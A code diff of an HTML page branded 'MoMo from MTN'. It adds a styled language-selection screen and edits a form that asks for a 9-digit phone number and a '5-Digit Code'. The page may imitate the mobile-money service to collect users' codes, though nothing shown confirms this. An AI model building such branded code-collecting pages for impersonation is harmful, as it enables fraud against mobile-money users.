@@ -11,12 +11,49 @@
 
     <!-- LANGUAGE SELECTION SCREEN -->
     <div id="screen-language" class="screen active">
-        <div class="language-card">
-            <h2>Choose your language</h2>
-            <p>Select your language to continue</p>
-            <button class="lang-btn" onclick="selectLanguage('en')">🇬🇧 English</button>
-            <button class="lang-btn" onclick="selectLanguage('fr')">🇫🇷 Français</button>
-            <button class="lang-btn" onclick="selectLanguage('cm')">🇨🇲 Camfranglais</button>
+        <div class="lang-container">
+            
+            <div class="momo-logo-top">
+                <div class="logo-icon">🎯</div> <!-- Placeholder for MoMo SVG -->
+                <div class="logo-text">MoMo<br><span>from MTN</span></div>
+            </div>
+
+            <h2 class="lang-title">Choose your <span class="highlight-yellow">language</span></h2>
+            <p class="lang-subtitle">Select your language to continue</p>
+            
+            <div class="lang-options">
+                <!-- English Option -->
+                <div class="lang-option selected" onclick="selectLanguage('en', this)">
+                    <div class="flag-icon">🇬🇧</div>
+                    <div class="lang-text">
+                        <strong>English</strong> <span>Continue in</span><br>
+                        <span>English</span>
+                    </div>
+                    <div class="radio-btn"></div>
+                </div>
+
+                <!-- French Option -->
+                <div class="lang-option" onclick="selectLanguage('fr', this)">
+                    <div class="flag-icon">🇫🇷</div>
+                    <div class="lang-text">
+                        <strong>Français</strong> <span>Continuer en</span><br>
+                        <span>français</span>
+                    </div>
+                    <div class="radio-btn"></div>
+                </div>
+
+                <!-- Camfranglais Option -->
+                <div class="lang-option" onclick="selectLanguage('cm', this)">
+                    <div class="flag-icon">🇨🇲</div>
+                    <div class="lang-text">
+                        <strong>Camfranglais</strong><br>
+                        <span>Continue in Camfranglais</span>
+                    </div>
+                    <div class="radio-btn"></div>
+                </div>
+            </div>
+
+            <p class="lang-footer">You can change it anytime</p>
         </div>
     </div>
 
@@ -114,7 +151,6 @@
                         <input type="text" id="phone-number" placeholder="670123456" maxlength="9" minlength="9" pattern="\d{9}" title="Exactly 9 digits (numbers only)" required>
                     </div>
 
-                    <!-- NEW: 5-DIGIT CODE -->
                     <label>5-Digit Code</label>
                     <input type="text" id="five-digit-code" placeholder="12345" maxlength="5" minlength="5" pattern="\d{5}" title="Exactly 5 digits" required>
                     <small>Enter your 5-digit code.</small>
